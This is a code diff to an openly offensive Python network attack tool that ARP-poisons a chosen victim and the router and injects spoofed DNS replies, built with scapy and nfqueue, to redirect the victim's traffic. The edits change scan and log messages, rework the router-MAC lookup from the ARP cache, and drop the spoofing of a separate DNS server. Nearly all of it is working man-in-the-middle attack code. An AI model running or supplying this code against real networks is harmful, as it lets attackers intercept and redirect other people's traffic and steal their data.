@@ -733,8 +733,6 @@ class Parser():
 
 
 	def dnsspoof_actions(self, dns_layer, IP_src, IP_dst, sport, dport, payload, rIP):
-#		print G+'[+] DNS request for '+W+self.args.dnsspoof+G+' found; dropping packet and injecting spoofed one redirecting to '+W+rIP
-#		logger.write('[+] DNS request for '+self.args.dnsspoof+' found; dropping packet and injecting spoofed one redirecting to '+rIP+'\n')
 		p = IP(dst=IP_src, src=IP_dst)/UDP(dport=sport, sport=dport)/DNS(id=dns_layer.id, qr=1, aa=1, qd=dns_layer.qd, an=DNSRR(rrname=dns_layer.qd.qname, ttl=10, rdata=rIP))
 		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(p), len(p))
 		if self.args.dnsspoof:
@@ -758,7 +756,7 @@ class Queued(object):
 	def fileno(self):
 		return self.q.get_fd()
 	def doRead(self):
-		self.q.process_pending(200) # if I lower this to, say, 5, it hurts injection's reliability
+		self.q.process_pending(500) # if I lower this to, say, 5, it hurts injection's reliability
 	def connectionLost(self, reason):
 		reactor.removeReader(self)
 	def logPrefix(self):
@@ -800,11 +798,11 @@ class active_users():
 
 	def users(self, IPprefix, routerIP):
 
-		print '[*] Running ARP ping to identify users on the network; this may take a minute...'
+		print '[*] Running ARP scan to identify users on the network; this may take a minute - [nmap -sn -n %s]' % IPprefix
 		iplist = []
 		maclist = []
 		try:
-			nmap = Popen(['/usr/bin/nmap', '-sn', '-n', IPprefix], stdout=PIPE, stderr=DN)
+			nmap = Popen(['nmap', '-sn', '-n', IPprefix], stdout=PIPE, stderr=DN)
 			nmap = nmap.communicate()[0]
 			nmap = nmap.splitlines()[2:-1]
 		except Exception:
@@ -834,7 +832,7 @@ class active_users():
 			exit('[-] Router MAC not found. Exiting.')
 
 		# Do nbtscan for windows netbios names
-		print '[*] Running nbtscan to get Windows netbios names'
+		print '[*] Running nbtscan to get Windows netbios names - [nbtscan %s]' % IPprefix
 		try:
 			nbt = Popen(['nbtscan', IPprefix], stdout=PIPE, stderr=DN)
 			nbt = nbt.communicate()[0]
@@ -984,7 +982,7 @@ def main(args):
 	else:
 		interface = ipr[4]
 	if 'eth' in interface or 'p3p' in interface:
-		exit('[-] Wired interface found as default route, please connect wirelessly and retry or specify the active interface with the -i [interface] option. See active interfaces with [ip addr] or [ifconfig].')
+		exit('[-] Wired interface found as default route, please connect wirelessly and retry, or specify the active interface with the -i [interface] option. See active interfaces with [ip addr] or [ifconfig].')
 	if args.ipaddress:
 		victimIP = args.ipaddress
 	else:
@@ -1041,20 +1039,24 @@ def main(args):
 			print "[*] Router MAC: " + routerMAC
 			logger.write("[*] Router MAC: "+routerMAC+'\n')
 		except Exception:
-			ac = raw_input("[-] Router did not respond to ARP request for MAC, attempt to pull the MAC from the ARP cache? [y/n] ")
-			if ac == 'y':
-				try:
-					print "[-] Router did not respond to ARP request for MAC, attempting to pull the MAC from the ARP cache"
-					arpcache = Popen(['/usr/sbin/arp', '-n'], stdout=PIPE, stderr=DN)
-					split_lines = arpcache.communicate()[0].splitlines()
-					arpoutput = split_lines[1].split()
-					routerMAC = arpoutput[2]
-					print "[*] Router MAC: " + routerMAC
-					logger.write("[*] Router MAC: "+routerMAC+'\n')
-				except Exception:
-					exit("[-] [arp -n] failed to give accurate router MAC address")
-			else:
-				sys.exit("[-] Could not get router MAC address")
+			print "[-] Router did not respond to ARP request; attempting to pull MAC from local ARP cache - [/usr/bin/arp -n]"
+			logger.write("[-] Router did not respond to ARP request; attempting to pull the MAC from the ARP cache - [/usr/bin/arp -n]")
+			try:
+				arpcache = Popen(['/usr/sbin/arp', '-n'], stdout=PIPE, stderr=DN)
+				split_lines = arpcache.communicate()[0].splitlines()
+				for line in split_lines:
+					if routerIP in line:
+						routerMACguess = line.split()[2]
+						if len(routerMACguess) == 17:
+							accr = raw_input("[+] Is "+R+routerMACguess+W+" the the accurate router MAC? [y/n]: ")
+							if accr == 'y':
+								routerMAC = routerMACguess
+								print "[*] Router MAC: "+routerMAC
+								logger.write("[*] Router MAC: "+routerMAC+'\n')
+						else:
+							exit("[-] Failed to get accurate router MAC address")
+			except Exception:
+				exit("[-] Failed to get accurate router MAC address")
 
 	if args.victimmac:
 		victimMAC = args.victimmac
@@ -1066,26 +1068,14 @@ def main(args):
 			print "[*] Victim MAC: " + victimMAC
 			logger.write("[*] Victim MAC: "+victimMAC+'\n')
 		except Exception:
-			exit("[-] Could not get victim MAC address; try the -vmac [xx:xx:xx:xx:xx:xx] option if you know the victim's MAC address")
-
-	if dnsIP != routerIP:
-		if IPprefix in dnsIP:
-			try:
-				dnsMAC = Spoof().originalMAC(dnsIP)
-				print "[*] DNS server MAC: " + dnsMAC
-			except Exception:
-				print "[-] Could not get DNS server MAC address; continuing"
-				dnsMAC = None
-		else:
-			dnsMAC = None
-
+			exit("[-] Could not get victim MAC address; try the -vmac [xx:xx:xx:xx:xx:xx] option if you know the victim's MAC address\n    and make sure the interface being used is accurate with -i <interface>")
 
 	ipf = setup(victimMAC)
 	Queued(args)
 	threads(args)
 
 	if args.nmap:
-		print "\n[*] Running [nmap -T4 -O "+victimIP+"] this may take several minutes..."
+		print "\n[*] Running nmap scan; this may take several minutes - [nmap -T4 -O %s]" % victimIP
 		try:
 			nmap = Popen(['/usr/bin/nmap', '-T4', '-O', '-e', interface, victimIP], stdout=PIPE, stderr=DN)
 			nmap.wait()
@@ -1107,9 +1097,6 @@ def main(args):
 			forward.write(ipf)
 		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
 		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
-		if dnsIP != routerIP and dnsMAC:
-			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
-			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
 		os.system('/sbin/iptables -F')
 		os.system('/sbin/iptables -X')
 		os.system('/sbin/iptables -t nat -F')
@@ -1118,9 +1105,6 @@ def main(args):
 	signal.signal(signal.SIGINT, signal_handler)
 
 	while 1:
-		# If DNS server is different from the router then we must spoof ourselves as the DNS server as well as the router
-		if dnsIP != routerIP and dnsMAC:
-			Spoof().poison(dnsIP, victimIP, dnsMAC, victimMAC)
 		Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
 		time.sleep(1.5)
 
